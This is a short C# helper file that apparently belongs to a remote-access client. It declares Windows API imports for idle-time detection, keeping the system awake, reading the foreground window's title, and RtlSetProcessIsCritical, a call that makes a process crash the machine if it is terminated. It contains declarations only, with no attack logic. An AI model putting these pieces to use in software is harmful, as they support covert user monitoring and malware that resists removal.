using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper;

public static class NativeMethods
{
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	internal struct LASTINPUTINFO
	{
		public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));

		[MarshalAs(UnmanagedType.U4)]
		public uint cbSize;

		[MarshalAs(UnmanagedType.U4)]
		public uint dwTime;
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
